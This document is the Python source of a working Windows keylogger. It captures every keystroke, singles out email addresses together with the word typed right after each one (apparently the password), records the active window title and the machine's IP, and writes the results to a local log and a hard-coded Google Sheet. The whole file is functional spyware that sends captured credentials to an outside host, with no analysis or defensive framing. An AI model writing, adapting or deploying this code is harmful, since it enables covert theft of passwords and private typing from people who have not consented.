import time
import logging
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from pynput import keyboard
import re
import socket
import win32gui
import time
import win32process
import win32api

def get_foreground_window():
    window = win32gui.GetForegroundWindow()
    return window

def get_foreground_window_name():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

def get_foreground_window_pid():
    window = win32gui.GetForegroundWindow()
    return win32process.GetWindowThreadProcessId(window)

# Set up logging
logging.basicConfig(filename='keylog.log', level=logging.DEBUG, format='%(asctime)s %(message)s')

# Set up Google Sheets API
scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('credentials.json', scope)
client = gspread.authorize(creds)

sheet_url = 'https://docs.google.com/spreadsheets/d/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/edit?usp=sharing'
sheet = client.open_by_url(sheet_url).sheet1

# Define regex pattern to match email addresses
email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'

# Set up word buffer and timestamp
word_buffer = ''
timestamp = ''

# Define function to update Google Sheet
def update_sheet(word, timestamp, window_name):
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        row = [word, timestamp, ip_address, window_name]
        sheet.append_row(row)
        logging.info(f"Added row: {row}")
    except Exception as e:
        logging.error(f"Error adding row: {row}\n{e}")

# Define function to handle keystrokes
def on_press(key):
    global word_buffer
    global timestamp

    try:
        # Get current timestamp
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

        # Check if space key was pressed
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            # Check if word buffer is not empty
            if word_buffer != '':
                # Check if word buffer contains an email address
                if re.match(email_pattern, word_buffer):
                    # Highlight email address in green
                    print('\033[92m{}\033[00m'.format(word_buffer))
                    logging.info(word_buffer)

                    # Check if there is a word right after the email address
                    if len(word_buffer.split()) > 1:
                        # Highlight the word right after the email address in yellow
                        print('\033[93m{}\033[00m'.format(word_buffer.split()[1]))
                        logging.info(word_buffer.split()[1])
                else:
                    # Log word to console and file
                    print(word_buffer)
                    logging.info(word_buffer)

                # Get foreground window name
                window_name = get_foreground_window_name()
        
                # Update Google Sheet with word, timestamp, and IP address
                update_sheet(word_buffer, timestamp, window_name)

                # Reset word buffer
                word_buffer = ''
        
        # check if backspace key was pressed
        elif key == keyboard.Key.backspace:
            # Remove last character from word buffer
            word_buffer = word_buffer[:-1]

        elif key == keyboard.Key.esc:
            # Stop listener if app is VSCode and exit
            print(get_foreground_window_name())
            if 'Visual Studio Code' in get_foreground_window_name():
                return False

        else:
            # Add character to word buffer
            word_buffer += key.char
    except AttributeError:
        pass

# Set up keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
